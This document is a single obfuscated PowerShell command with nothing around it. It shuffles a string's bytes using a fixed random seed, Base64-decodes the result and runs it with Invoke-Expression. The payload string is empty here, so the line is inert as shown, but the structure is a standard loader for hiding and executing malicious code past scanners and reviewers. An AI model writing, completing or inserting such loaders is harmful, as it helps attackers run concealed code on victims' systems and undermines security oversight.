
$RZXTyvJPuh = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes('') | Sort-Object { Get-Random -SetSeed 482688917 })); $yE = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($RZXTyvJPuh)); IEX $yE
